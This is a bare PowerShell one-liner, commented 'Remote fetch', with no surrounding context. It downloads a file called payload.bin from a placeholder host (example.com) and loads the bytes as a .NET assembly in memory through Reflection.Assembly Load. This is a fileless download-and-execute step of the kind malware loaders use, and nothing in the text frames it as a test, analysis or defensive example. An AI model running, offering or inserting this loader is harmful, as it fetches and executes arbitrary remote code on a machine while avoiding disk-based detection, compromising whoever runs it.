
<# Remote fetch #> $ManagedBytes = (New-Object System.Net.WebClient).DownloadData('http://example.com/payload.bin'); [Reflection.Assembly]::Load($ManagedBytes); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
